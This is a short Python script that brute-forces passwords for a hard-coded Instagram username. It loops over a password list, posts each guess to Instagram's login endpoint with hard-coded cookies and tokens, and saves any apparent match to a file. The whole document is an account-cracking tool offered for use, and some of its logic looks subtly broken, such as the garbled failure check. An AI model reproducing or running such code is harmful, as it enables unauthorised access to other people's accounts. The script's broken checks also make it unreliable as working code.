import requests

def user():
    x = "stackcopy" #Enter username here
    with open("passwd_list.txt","r") as f:
        cookies = {"Cookie":"csrftoken=xE6HN2kg13rv3K5OgjVVxj4hO3NGpQSD;mid=XY9tGAABAAGSo0x6qCJytG9x3Gln;ig_did=D3B82DC0-AD40-43FA-B69E-0C6EC2D8B9EE;rur=ATN"}
        for line in f:
            data = {"username":x,"password":line,"enc_password":"#PWD_INSTAGRAM_BROWSER:6:1576696356181:AfVQAB2J8QrhK2LOAAXDAAAruv01zcwiwBYutXdNsHuQXDN6OobZbPPmp4obTzImQHg7DUfzO2xfPL8PepCIcJ5aZc3IoTcynhQm2Ca0wt5DCJ3qPr3vCJBq1OvD1+Xl1IxvSgPf6bPdbw==","access_token":"1217981644879628|65a937f07619e8d4dce239c462a447ce"}
            data["password"] = line
            r = requests.post("https://www.instagram.com/accounts/login/ajax/",data=data,cookies=cookies)
            if r.status_code == 200:
                p = open("Password.txt","w+")
                p.write(x + ":" + line)
                p.close()
                print("\033[1;32;40m Successful, password is stored in: Password.txt")
            elif line == r.status_code == 404:
                print("\033[1;31;40m Failed, Password could not be brute forced")

